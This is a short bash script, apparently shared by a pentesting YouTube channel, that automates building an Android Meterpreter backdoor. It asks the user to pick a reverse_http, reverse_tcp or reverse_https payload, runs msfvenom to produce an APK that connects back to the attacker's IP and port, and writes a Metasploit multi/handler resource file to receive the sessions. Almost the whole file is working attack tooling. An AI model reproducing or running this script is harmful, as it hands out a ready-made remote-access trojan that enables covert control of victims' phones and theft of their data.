#!/bin/bash
abort()
{
    echo "An error occurred. Exiting..." >&2
    exit 1
}

trap 'abort' 0
set -e
echo -e "\033[32m"
path=`pwd`
myip='curl ipecho.net/plain'
echo  "##############################################################"
echo  "## Please subscribe To my youtube channel ##                ##"
echo  "## https://www.youtube.com/channel/UCd9ZDgfoabrObsNGqz4gQvw ##"
echo  "## By Chihab Os :) PentestersLab                            ##"
echo  "##############################################################"
echo -n " Hi please  what you want to use ?
1 android/rev_http && creat handler
2 android/rev_tcp && creat handler
3 android/rev_https && creat handler  >>> : "
read rev
echo 'Your Ip Address is'
ifconfig | grep 'inet '
echo 'Your External IP address is '
$myip ; echo
echo -n "Please enter Your Ip Address >>> :  "
read Ip
echo -n "Pleas enter the port you want to use >>> : "
read port
if [[ $rev = 1 ]]; then
echo "wait until the workers build a castle {payload} for you haha XD....."
sudo msfvenom -p android/meterpreter/reverse_http LHOST=$Ip LPORT=${port} R > ${path}/androvenom.apk
echo "You will finde it here"
echo $path
sudo mkdir ${path}/revhttp.rc | printf "use exploit/multi/handler \nset lport $port \nset lhost $Ip \nset ExitOnSession false \nset payload android/meterpreter/reverse_http \nexploit -j " > revhttp.rc
echo "wait while creating a  handler :D ...."
sleep 3
echo "You can start a handler with Metasploit at any time by runing this commend msfconsole -r revhttp.rc"
elif [[ $rev = 2 ]]; then
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=${Ip} LPORT=${port} R > ${path}/androvenom_tcp.apk
echo "You will finde it here"
echo ${path}
touch ${path}/revtcp.rc | printf "use exploit/multi/handler \nset lport $port \nset lhost $Ip \nset ExitOnSession false \nset payload android/meterpreter/reverse_tcp \nexploit -j " > revtcp.rc
echo "wait while creating a  handler :D ...."
sleep 3
echo "You can start a handler with Metasploit at any time by runing this commend msfconsole -r revtcp.rc"
elif [[ $rev = 3 ]]; then
sudo msfvenom -p android/meterpreter/reverse_https LHOST=${Ip} LPORT=${port} R > ${path}/androvenom_https.apk
echo "You will finde it here"
echo ${path}
touch ${path}/revhttps.rc | printf "use exploit/multi/handler \nset lport $port \nset lhost $Ip \nset ExitOnSession false \nset payload android/meterpreter/reverse_https \nexploit -j " > revhttps.rc
echo "wait while creating a  handler :D ...."
sleep 3
echo "You can start a handler with Metasploit at any time by runing this commend msfconsole -r revhttps.rc"
else
echo "error"
exit
fi
trap : 0
